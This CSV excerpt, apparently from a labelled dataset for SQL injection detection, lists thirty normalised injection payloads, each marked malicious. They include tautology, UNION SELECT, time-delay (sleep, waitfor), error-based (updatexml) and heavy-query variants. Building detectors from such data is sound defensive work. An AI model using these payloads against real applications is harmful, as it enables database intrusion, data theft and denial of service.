row_index,payload_norm,label,sqli_type_hint
6480,"1%"" or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ""%"" = """,1,
6481,"1"" ) as hhxx where 3372 = 3372 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
6482,"1"" ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""rzja"" like ""rzja",1,
6483,"1"" ) ) ) and 5429 = 9596",1,
6484,"-3541"" or make_set ( 9354 = 9354,7185 ) and ""fgxu"" = ""fgxu",1,
6485,"-6580' ) union all select 9950,9950,9950,9950,9950,9950--",1,
6486,"-4350"" ) ) as mmwq where 9801 = 9801 or ( 8520 = 2834 ) *2834--",1,
6487,-1485' ) or ( 2056 = 4008 ) *4008 and ( 'vphj' = 'vphj,1,
6488,1' ) order by 1--,1,
6489,"-2384'|| ( select 'vhcp' from dual where 1266 = 1266 union all select 1266,1266,1266,1266--",1,
6490,"-7350' ) ) ) union all select 9207,9207,9207,9207--",1,
6491,1 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
6492,"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",1,
6493,"1 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) -- mwsm",1,
6494,-1866' ) ) as cwtv where 3295 = 3295 order by 1--,1,
6495,"1 ) as zqxa where 5718 = 5718 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
6496,"-2054%"" ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""%"" = """,1,
6497,"1"" ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ""usht"" like ""usht",1,
6498,"1"" where 1683 = 1683 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",1,
6499,"-1908"" ) where 6420 = 6420 union all select 6420,6420,6420,6420--",1,
6500,"1"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ""nsyl"" = ""nsyl",1,
6501,waitfor delay '0:0:5' and ( '%' = ',1,
6502,"-5800"" ) or 6872 = 6872 and ( ""tcab"" like ""tcab",1,
6503,select ( case when ( 4415 = 2051 ) then 4415 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
6504,"-6097%' ) ) union all select 3990,3990,3990,3990,3990,3990--",1,
6505,1' and 9198 = 9198--,1,
6506,"1%"" ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
6507,1' ) as xwlf where 9424 = 9424,1,
6508,"1"" ) as xsgx where 5239 = 5239 union all select null,null--",1,
6509,"-7737'|| ( select 'xalo' where 9219 = 9219 union all select 9219,9219,9219,9219#",1,
